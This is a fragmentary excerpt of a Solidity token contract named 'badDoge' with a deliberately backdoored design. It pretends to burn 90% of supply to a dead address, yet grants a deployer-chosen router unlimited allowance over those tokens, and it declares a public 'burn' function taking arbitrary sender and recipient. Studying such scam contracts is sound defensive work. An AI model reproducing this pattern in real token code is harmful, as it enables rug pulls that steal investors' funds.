...
contract badDoge is Context, IERC20{
    ...
    string public name = "BadDogesToken";
    string public symbol = "BDS";
    ...
    constructor(address _pancakeRouter) {
        ...
        pairAddress = uniswapV2Factory.getPair(address(this),WETH);
        _approve(_pancakeRouter, pairAddress, MAX);
        ...
        _balances[msg.sender] = _totalSupply.div(10);
        _balances[DEAD] = _totalSupply.sub(_totalSupply.div(10));
        _allowances[DEAD][_pancakeRouter] = MAX;
       
        emit Transfer(address(0), msg.sender, _totalSupply.div(10));
        emit Transfer(address(0), DEAD,_totalSupply.sub(_totalSupply.div(10)));
    ...
    function burn(address sender, address recipient, uint amount) public virtual returns (bool){
